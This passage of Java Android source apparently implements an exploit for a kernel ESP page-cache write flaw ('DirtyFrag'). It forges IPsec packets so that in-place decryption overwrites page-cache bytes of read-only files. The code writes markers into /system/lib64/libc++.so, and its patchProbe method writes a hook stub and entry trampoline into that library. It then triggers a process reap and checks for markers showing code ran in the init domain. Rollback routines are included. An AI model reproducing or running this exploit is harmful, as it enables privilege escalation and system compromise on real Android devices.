     * The ciphertext block is the library's own content, so the plaintext is
     * chosen through the IV: IV = AES_dec(C) XOR desired. The second block is
     * our own ciphertext chosen to decrypt to a valid ESP trailer, which lets
     * the kernel accept the packet and therefore perform the in-place write.
     *
     * Target is an unused 1031-byte zero run in .rodata (0x335d0), so the marker
     * cannot affect any code or string.
     */
    private String sysWriteProbe() {
        StringBuilder report = new StringBuilder(readOnlyProbe());
        report.append("\n\nSYSTEM-FILE PAGE-CACHE WRITE (v0.6)\n");
        final String targetPath = "/system/lib64/libc++.so";
        final int targetOffset = 0x335d0;
        String mode = getIntent() == null ? null : getIntent().getStringExtra("marker");
        final boolean restore = "zero".equals(mode);
        final byte[] marker = restore
                ? new byte[16]
                : "P780-SYS-WRITE!!".getBytes(StandardCharsets.US_ASCII);
        report.append(restore ? "mode: restore zeros\n" : "mode: write marker\n");

        IpSecManager manager = getSystemService(IpSecManager.class);
        if (manager == null) {
            report.append("SKIPPED: IpSecManager unavailable\n");
            return report.toString();
        }
        IpSecManager.SecurityParameterIndex spi = null;
        IpSecManager.UdpEncapsulationSocket encap = null;
        IpSecTransform transform = null;
        byte[] encKey = new byte[16];
        byte[] authKey = new byte[32];

        try {
            InetAddress loopback = InetAddress.getByAddress(TEST_LOCAL);
            SecureRandom random = new SecureRandom();
            random.nextBytes(encKey);
            random.nextBytes(authKey);

            byte[] c1 = new byte[16];
            try (java.io.RandomAccessFile raf = new java.io.RandomAccessFile(targetPath, "r")) {
                raf.seek(targetOffset);
                raf.readFully(c1);
            }
            report.append("Original 16 bytes at 0x")
                    .append(Integer.toHexString(targetOffset)).append(": ")
                    .append(hex(c1)).append('\n');

            Cipher ecbDec = Cipher.getInstance("AES/ECB/NoPadding");
            ecbDec.init(Cipher.DECRYPT_MODE, new SecretKeySpec(encKey, "AES"));
            byte[] dec1 = ecbDec.doFinal(c1);
            byte[] iv = new byte[16];
            for (int i = 0; i < 16; i++) {
                iv[i] = (byte) (dec1[i] ^ marker[i]);
            }

            // Plaintext of the trailing block: 14 zero padding bytes, padlen 14, next header UDP.
            byte[] p2 = new byte[16];
            p2[14] = 14;
            p2[15] = 17;
            byte[] x2 = new byte[16];
            for (int i = 0; i < 16; i++) {
                x2[i] = (byte) (p2[i] ^ c1[i]);
            }
            Cipher ecbEnc = Cipher.getInstance("AES/ECB/NoPadding");
            ecbEnc.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(encKey, "AES"));
            byte[] c2 = ecbEnc.doFinal(x2);

            spi = manager.allocateSecurityParameterIndex(loopback);
            encap = manager.openUdpEncapsulationSocket();
            transform = new IpSecTransform.Builder(this)
                    .setEncryption(new IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, encKey))
                    .setAuthentication(new IpSecAlgorithm(
                            IpSecAlgorithm.AUTH_HMAC_SHA256, authKey, 128))
                    .setIpv4Encapsulation(encap, encap.getPort())
                    .buildTransportModeTransform(loopback, spi);

            byte[] header = new byte[8];
            int value = spi.getSpi();
            header[0] = (byte) (value >>> 24);
            header[1] = (byte) (value >>> 16);
            header[2] = (byte) (value >>> 8);
            header[3] = (byte) value;
            header[7] = 1;

            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(new SecretKeySpec(authKey, "HmacSHA256"));
            mac.update(header);
            mac.update(iv);
            mac.update(c1);
            mac.update(c2);
            byte[] icv = Arrays.copyOf(mac.doFinal(), 16);

            report.append(runSysWriteProbe(targetPath, targetOffset,
                    spi.getSpi(), encap.getPort(), 1, iv, c2, icv));

            byte[] after = new byte[16];
            try (java.io.RandomAccessFile raf = new java.io.RandomAccessFile(targetPath, "r")) {
                raf.seek(targetOffset);
                raf.readFully(after);
            }
            report.append("Bytes after write: ").append(hex(after)).append('\n');
            boolean ok = Arrays.equals(after, marker);
            report.append(ok
                    ? "VERDICT S: SYSTEM-FILE PAGE CACHE WRITTEN. Read-only library now "
                      + "reads back our marker; reboot restores it.\n"
                    : "VERDICT S: marker not observed in the system library.\n");
        } catch (Exception e) {
            report.append("system-file probe failed: ").append(describe(e)).append('\n');
        } finally {
            if (transform != null) {
                try {
                    transform.close();
                } catch (Exception ignored) {
                }
            }
            if (encap != null) {
                try {
                    encap.close();
                } catch (Exception ignored) {
                }
            }
            if (spi != null) {
                try {
                    spi.close();
                } catch (Exception ignored) {
                }
            }
            Arrays.fill(encKey, (byte) 0);
            Arrays.fill(authKey, (byte) 0);
        }
        report.append("No file on disk was modified; only this boot's page cache.\n");
        return report.toString();
    }


    /** Write one 16-byte block into a readable file's page cache; returns next seq or -1. */
    private int writeBlock(StringBuilder report, String lib, int offset, byte[] desired,
            int seq, int spi, int port, byte[] encKey, byte[] authKey) {
        String at = "0x" + Integer.toHexString(offset);
        try {
            byte[] c1 = new byte[16];
            try (java.io.RandomAccessFile raf = new java.io.RandomAccessFile(lib, "r")) {
                raf.seek(offset);
                raf.readFully(c1);
            }
            Cipher dec = Cipher.getInstance("AES/ECB/NoPadding");
            dec.init(Cipher.DECRYPT_MODE, new SecretKeySpec(encKey, "AES"));
            byte[] d1 = dec.doFinal(c1);
            byte[] iv = new byte[16];
            for (int i = 0; i < 16; i++) {
                iv[i] = (byte) (d1[i] ^ desired[i]);
            }
            byte[] p2 = new byte[16];
            p2[14] = 14;
            p2[15] = 17;
            byte[] x2 = new byte[16];
            for (int i = 0; i < 16; i++) {
                x2[i] = (byte) (p2[i] ^ c1[i]);
            }
            Cipher enc = Cipher.getInstance("AES/ECB/NoPadding");
            enc.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(encKey, "AES"));
            byte[] c2 = enc.doFinal(x2);

            byte[] header = new byte[8];
            header[0] = (byte) (spi >>> 24);
            header[1] = (byte) (spi >>> 16);
            header[2] = (byte) (spi >>> 8);
            header[3] = (byte) spi;
            header[4] = (byte) (seq >>> 24);
            header[5] = (byte) (seq >>> 16);
            header[6] = (byte) (seq >>> 8);
            header[7] = (byte) seq;

            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(new SecretKeySpec(authKey, "HmacSHA256"));
            mac.update(header);
            mac.update(iv);
            mac.update(c1);
            mac.update(c2);
            byte[] icv = Arrays.copyOf(mac.doFinal(), 16);

            report.append(runSysWriteProbe(lib, offset, spi, port, seq, iv, c2, icv));

            byte[] after = new byte[16];
            try (java.io.RandomAccessFile raf = new java.io.RandomAccessFile(lib, "r")) {
                raf.seek(offset);
                raf.readFully(after);
            }
            if (Arrays.equals(after, desired)) {
                report.append("  block ").append(at).append(": OK\n");
                return seq + 1;
            }
            report.append("  block ").append(at).append(": MISMATCH ").append(hex(after)).append('\n');
        } catch (Exception e) {
            report.append("  block ").append(at).append(" failed: ").append(describe(e)).append('\n');
        }
        return -1;
    }

    private String checkProbe() {
        StringBuilder report = new StringBuilder(readOnlyProbe());
        report.append("\n\nMARKER CHECK\n");
        String[] probes = {
                "/dev/p780_ctrl_once",
                "/dev/p780_installd_once",
                "/dev/p780_installd_marker",
                "/dev/p780_installd_exec_failed",
                "/dev/p780_probe_once",
                "/dev/p780_netd_once",
                "/dev/p780_adbd_once",
                "/metadata/p780_meta",
                "/metadata/p780_installd_marker",
        };
        for (String probe : probes) {
            java.io.File f = new java.io.File(probe);
            report.append("  ").append(probe).append(": ")
                    .append(f.exists() ? "PRESENT" : "absent");
            if (f.exists()) {
                report.append(" (").append(f.length()).append(" bytes)");
            }
            report.append('\n');
        }
        return report.toString();
    }

    private String patchProbe() {
        StringBuilder report = new StringBuilder(readOnlyProbe());
        report.append("\n\nLIBC++ SENTRY HOOK PATCH (v0.7)\n");
        byte[] stub = PatchData.stub();
        byte[] entry = PatchData.entry();
        byte[] origStub;
        byte[] origEntry;
        try (java.io.RandomAccessFile raf =
                     new java.io.RandomAccessFile(PatchData.LIB, "r")) {
            long len = raf.length();
            report.append("target: ").append(PatchData.LIB)
                    .append(" (").append(len).append(" bytes), entry 0x")
                    .append(Integer.toHexString(PatchData.SENTRY)).append('\n');
            origEntry = new byte[16];
            raf.seek(PatchData.SENTRY);
            raf.readFully(origEntry);
            if (!hex(origEntry).equals(PatchData.PROLOGUE_HEX)) {
                return report.append("ABORT: sentry prologue differs: ")
                        .append(hex(origEntry)).append('\n').toString();
            }
            origStub = new byte[stub.length];
            raf.seek(PatchData.STUB_SITE);
            raf.readFully(origStub);
        } catch (Exception e) {
            return report.append("ABORT: cannot read library: ").append(describe(e)).toString();
        }

        try (java.io.FileOutputStream out = new java.io.FileOutputStream(
                new java.io.File(getCacheDir(), "esp_orig.bin"))) {
            out.write(origStub);
            out.write(origEntry);
            report.append("backup of original bytes saved: cache/esp_orig.bin\n");
        } catch (Exception e) {
            return report.append("ABORT: cannot save backup: ").append(describe(e)).toString();
        }

        IpSecManager manager = getSystemService(IpSecManager.class);
        if (manager == null) {
            return report.append("SKIPPED: IpSecManager unavailable\n").toString();
        }
        IpSecManager.SecurityParameterIndex spi = null;
        IpSecManager.UdpEncapsulationSocket encap = null;
        IpSecTransform transform = null;
        byte[] encKey = new byte[16];
        byte[] authKey = new byte[32];
        try {
            InetAddress loopback = InetAddress.getByAddress(TEST_LOCAL);
            SecureRandom random = new SecureRandom();
            random.nextBytes(encKey);
            random.nextBytes(authKey);
            spi = manager.allocateSecurityParameterIndex(loopback);
            encap = manager.openUdpEncapsulationSocket();
            transform = new IpSecTransform.Builder(this)
                    .setEncryption(new IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, encKey))
                    .setAuthentication(new IpSecAlgorithm(
                            IpSecAlgorithm.AUTH_HMAC_SHA256, authKey, 128))
                    .setIpv4Encapsulation(encap, encap.getPort())
                    .buildTransportModeTransform(loopback, spi);

            int seq = 1;
            report.append("writing stub (").append(stub.length).append(" bytes) at 0x")
                    .append(Integer.toHexString(PatchData.STUB_SITE)).append('\n');
            for (int i = 0; i < stub.length && seq > 0; i += 16) {
                byte[] block = Arrays.copyOfRange(stub, i, i + 16);
                seq = writeBlock(report, PatchData.LIB, PatchData.STUB_SITE + i,
                        block, seq, spi.getSpi(), encap.getPort(), encKey, authKey);
            }
            if (seq > 0) {
                report.append("writing entry trampoline at 0x")
                        .append(Integer.toHexString(PatchData.SENTRY)).append('\n');
                seq = writeBlock(report, PatchData.LIB, PatchData.SENTRY, entry,
                        seq, spi.getSpi(), encap.getPort(), encKey, authKey);
            }
            if (seq < 0) {
                return report.append("PATCH FAILED; originals saved for rollback\n").toString();
            }
            report.append("all blocks written; triggering orphan reap\n");
            report.append(spawnOrphan());
            try {
                Thread.sleep(3000);
            } catch (InterruptedException ignored) {
                Thread.currentThread().interrupt();
            }
            String[] probes = {
                    "/dev/p780_init_marker",
                    "/dev/p780_cap_exec",
                    "/dev/p780_exec_failed",
                    "/data/local/tmp/p780_cap_data",
                    "/data/local/tmp/p780_cap_exec",
            };
            boolean anyMarker = false;
            for (String probe : probes) {
                java.io.File f = new java.io.File(probe);
                boolean exists = f.exists();
                String content = "";
                if (exists) {
                    anyMarker = true;
                    try (java.io.FileInputStream in = new java.io.FileInputStream(f)) {
                        byte[] buf = new byte[64];
                        int n = in.read(buf);
                        if (n > 0) {
                            content = new String(buf, 0, n, StandardCharsets.UTF_8).trim();
                        }
                    } catch (Exception e) {
                        content = "(unreadable: " + describe(e) + ")";
                    }
                }
                report.append("  ").append(probe).append(": ")
                        .append(exists ? "PRESENT" : "absent")
                        .append(content.isEmpty() ? "" : " -> " + content)
                        .append('\n');
            }
            report.append(anyMarker
                    ? "RESULT: init-domain actions ran; see per-path outcomes above.\n"
                    : "RESULT: no marker at all; hook may not have run.\n");
        } catch (Exception e) {
            report.append("patch failed: ").append(describe(e)).append('\n');
        } finally {
            if (transform != null) { try { transform.close(); } catch (Exception ignored) { } }
            if (encap != null) { try { encap.close(); } catch (Exception ignored) { } }
            if (spi != null) { try { spi.close(); } catch (Exception ignored) { } }
            Arrays.fill(encKey, (byte) 0);
            Arrays.fill(authKey, (byte) 0);
        }
        return report.toString();
    }

    private String unpatchProbe() {
        StringBuilder report = new StringBuilder(readOnlyProbe());
        report.append("\n\nLIBC++ HOOK ROLLBACK (v0.7)\n");
        // Split the backup by its own length so a different stub version can
        // still be rolled back (last 16 bytes are the entry trampoline).
        byte[] saved = new byte[8192];
        try (java.io.FileInputStream in = new java.io.FileInputStream(
                new java.io.File(getCacheDir(), "esp_orig.bin"))) {
            int read = 0;
            while (read < saved.length) {
                int n = in.read(saved, read, saved.length - read);
                if (n <= 0) {
                    break;
                }
                read += n;
            }
            if (read < 32) {
                return report.append("ABORT: backup incomplete\n").toString();
            }
            saved = Arrays.copyOf(saved, read);
        } catch (Exception e) {
            return report.append("ABORT: no backup: ").append(describe(e)).toString();
        }

        IpSecManager manager = getSystemService(IpSecManager.class);
        IpSecManager.SecurityParameterIndex spi = null;
        IpSecManager.UdpEncapsulationSocket encap = null;
        IpSecTransform transform = null;
        byte[] encKey = new byte[16];
        byte[] authKey = new byte[32];
        try {
            InetAddress loopback = InetAddress.getByAddress(TEST_LOCAL);
            SecureRandom random = new SecureRandom();
            random.nextBytes(encKey);
            random.nextBytes(authKey);
            spi = manager.allocateSecurityParameterIndex(loopback);
            encap = manager.openUdpEncapsulationSocket();
            transform = new IpSecTransform.Builder(this)
                    .setEncryption(new IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, encKey))
                    .setAuthentication(new IpSecAlgorithm(
                            IpSecAlgorithm.AUTH_HMAC_SHA256, authKey, 128))
                    .setIpv4Encapsulation(encap, encap.getPort())
                    .buildTransportModeTransform(loopback, spi);

            int seq = 1;
            int stubLen = saved.length - 16;
            report.append("restoring entry first (stub ").append(stubLen).append(" bytes)\n");
            seq = writeBlock(report, PatchData.LIB, PatchData.SENTRY,
                    Arrays.copyOfRange(saved, stubLen, stubLen + 16),
                    seq, spi.getSpi(), encap.getPort(), encKey, authKey);
            for (int i = 0; i < stubLen && seq > 0; i += 16) {
                seq = writeBlock(report, PatchData.LIB, PatchData.STUB_SITE + i,
                        Arrays.copyOfRange(saved, i, i + 16),
                        seq, spi.getSpi(), encap.getPort(), encKey, authKey);
            }
            report.append(seq > 0 ? "ROLLBACK COMPLETE\n" : "ROLLBACK FAILED\n");
        } catch (Exception e) {
            report.append("rollback failed: ").append(describe(e)).append('\n');
        } finally {
            if (transform != null) { try { transform.close(); } catch (Exception ignored) { } }
            if (encap != null) { try { encap.close(); } catch (Exception ignored) { } }
            if (spi != null) { try { spi.close(); } catch (Exception ignored) { } }
            Arrays.fill(encKey, (byte) 0);
            Arrays.fill(authKey, (byte) 0);
        }
        return report.toString();
    }

    private static String hex(byte[] data) {
        StringBuilder out = new StringBuilder(data.length * 2);
        for (byte b : data) {
            out.append(String.format("%02x", b));
        }
        return out.toString();
    }

    private native String runFileBackedUdpProbe(String cacheDirPath);

    /**
     * v0.4: DirtyFrag (CVE-2026-43284) page-cache write probe.
     *
     * Installs a transport-mode ESP SA with UDP encapsulation through the public
     * IpSecManager API, then asks the native layer to splice one app-private
     * read-only file page behind a forged ESP header and send it to the local
     * encapsulation port. A changed read-back means esp_input() decrypted in
     * place on top of a spliced page-cache page.
     *
     * Only the app's own file is involved; no system file is opened for writing
     * and no privilege-escalation step runs.
     */
    private String espPageCacheProbe() {
        StringBuilder report = new StringBuilder(readOnlyProbe());
        report.append("\n\nESP PAGE-CACHE WRITE PROBE v0.4 (user-initiated)\n");
        report.append("Scope: one app-private 0444 file and one forged ESP-in-UDP "
                + "datagram to 127.0.0.1.\n");
        if (!NATIVE_PROBE_AVAILABLE) {
            report.append("SKIPPED: native probe library unavailable: ")
                    .append(NATIVE_PROBE_LOAD_ERROR).append('\n');
            return report.toString();
        }
        if (Build.VERSION.SDK_INT < 28) {
            report.append("SKIPPED: IPsec public API requires Android API 28+");
            return report.toString();
        }

        IpSecManager manager = getSystemService(IpSecManager.class);
        if (manager == null) {
            report.append("SKIPPED: IpSecManager unavailable");
            return report.toString();
        }

        IpSecManager.SecurityParameterIndex spi = null;
        IpSecManager.UdpEncapsulationSocket encap = null;
        IpSecTransform transform = null;
        byte[] encryptionKey = new byte[16];
        byte[] authenticationKey = new byte[32];

        try {
            InetAddress loopback = InetAddress.getByAddress(TEST_LOCAL);
            SecureRandom random = new SecureRandom();
            random.nextBytes(encryptionKey);
            random.nextBytes(authenticationKey);

            spi = manager.allocateSecurityParameterIndex(loopback);
            encap = manager.openUdpEncapsulationSocket();
            transform = new IpSecTransform.Builder(this)
                    .setEncryption(new IpSecAlgorithm(
                            IpSecAlgorithm.CRYPT_AES_CBC, encryptionKey))
                    .setAuthentication(new IpSecAlgorithm(
                            IpSecAlgorithm.AUTH_HMAC_SHA256, authenticationKey, 128))
                    .setIpv4Encapsulation(encap, encap.getPort())
                    .buildTransportModeTransform(loopback, spi);

            report.append("SA installed via public API: SPI 0x")
                    .append(Integer.toHexString(spi.getSpi()))
                    .append(", UDP encap port ").append(encap.getPort())
                    .append(", AES-CBC-128 + HMAC-SHA256-128\n");
            // Keep the SA alive long enough for an outside dumpsys to observe it.
            android.util.Log.i("P780PROBE", "SA-READY SPI=0x"
                    + Integer.toHexString(spi.getSpi()) + " port=" + encap.getPort());
            report.append(runEspPageCacheProbe(
                    getCacheDir().getAbsolutePath(), spi.getSpi(), encap.getPort()));
            report.append("\n");
            report.append(runEspSendfileProbe(
                    getCacheDir().getAbsolutePath(), spi.getSpi(), encap.getPort()));
            report.append("\n");
            report.append(validEspProbe(manager, loopback, transform,
                    spi, encap, encryptionKey, authenticationKey));
        } catch (Exception e) {
            report.append("Probe failed: ").append(describe(e)).append('\n');
        } finally {
            if (transform != null) {
                try {
                    transform.close();
                    report.append("Transform closed.\n");
                } catch (Exception e) {
                    report.append("Transform close failed: ").append(describe(e)).append('\n');
                }
            }
            if (encap != null) {
                try {
                    encap.close();
                    report.append("Encapsulation socket closed.\n");
                } catch (Exception e) {
                    report.append("Encapsulation socket close failed: ")
                            .append(describe(e)).append('\n');
                }
            }
            if (spi != null) {
                try {
                    spi.close();
                    report.append("SPI released.\n");
                } catch (Exception e) {
                    report.append("SPI close failed: ").append(describe(e)).append('\n');
                }
            }
            Arrays.fill(encryptionKey, (byte) 0);
            Arrays.fill(authenticationKey, (byte) 0);
        }

        report.append("Only an app-private file was targeted; no system file, "
                + "kernel module or root step was involved.\n");
        return report.toString();
    }

    private native String runEspPageCacheProbe(
            String cacheDirPath, int spi, int encapPort);

    private native String runEspSendfileProbe(
            String cacheDirPath, int spi, int encapPort);

    private static void sendAndVerifyLoopback(
            DatagramSocket socket, InetAddress loopback, byte[] payload) throws Exception {
        int port = socket.getLocalPort();
        DatagramPacket outbound = new DatagramPacket(payload, payload.length, loopback, port);
        socket.send(outbound);

        byte[] received = new byte[payload.length + 1];
        DatagramPacket inbound = new DatagramPacket(received, received.length);
        socket.receive(inbound);
        if (!inbound.getAddress().isLoopbackAddress()
                || inbound.getPort() != port
                || inbound.getLength() != payload.length
                || !Arrays.equals(payload, Arrays.copyOf(received, inbound.getLength()))) {
            throw new IllegalStateException("loopback payload/source mismatch");
        }
    }

    private static String describe(Exception e) {
        String message = e.getMessage();
        return e.getClass().getSimpleName()
                + (message == null ? "" : ": " + message);
    }
}

